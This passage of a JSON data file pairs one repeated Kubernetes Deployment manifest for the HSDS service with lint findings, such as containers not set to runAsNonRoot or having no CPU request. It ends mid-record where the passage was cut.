    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"dn3\" is not set to runAsNonRoot"
  },
  {
    "id": "2795",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"dn4\" is not set to runAsNonRoot"
  },
  {
    "id": "2796",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"head\" is not set to runAsNonRoot"
  },
  {
    "id": "2797",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"rangeget\" is not set to runAsNonRoot"
  },
  {
    "id": "2798",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sn\" is not set to runAsNonRoot"
  },
  {
    "id": "2799",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"dn1\" has cpu request 0"
  },
  {
    "id": "2800",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: 